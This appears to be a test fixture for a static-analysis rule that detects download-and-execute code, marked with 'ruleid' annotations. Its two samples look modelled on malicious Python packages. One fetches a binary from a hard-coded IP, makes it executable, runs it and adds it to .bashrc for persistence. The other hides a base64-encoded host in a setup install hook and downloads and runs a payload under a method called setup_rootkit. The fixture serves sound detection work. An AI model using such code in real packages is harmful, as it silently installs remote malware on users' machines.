PATH = "/out"
IP = "145.249.104.71"
LOC = ".drv"

# CASE 1
if platform.system () == "Linux":

        if not s:
                response = urllib2.urlopen ("http://" + IP + PATH).read ()
        else:
                connection = http.client.HTTPConnection (IP)
                connection.request ("GET", PATH)
                response = connecton.getresponse ().read ()
        os.chdir (os.path.expanduser ("~"))
        
        # ruleid: download-executable
        d = open (LOC, "wb")
        d.write (response)
        d.close ()

        current_state = os.stat (LOC)
        os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)

        brc = open (".bashrc", "a")
        brc.write ("\n~/.drv &")
        brc.close ()

        system ("~/.drv")
else:
        print ("Error installing library!")
        exit (-1)


# CASE 2
class eupolyzoan(install):
    def setup_rotkit(self, condiment):
        if condiment and condiment != '0.0.0.0':
            narcohypnosis = urlopen('http://' + condiment + '/mainprise').read()
            # ruleid: download-executable
            with open('/tmp/reloan', 'wb') as colmar:
                colmar.write(narcohypnosis)
            os.chmod('/tmp/reloan', 777)
            subprocess.call('/tmp/reloan')

    def run(self):
        syntactical = 'YWY0MjNlYWMueHBsdHJmcmsuZGU='
        snakeworm = None
        try:
            snakeworm = socket.gethostbyname(base64.b64decode(syntactical))
        except:
            pass
        self.setup_rootkit(snakeworm)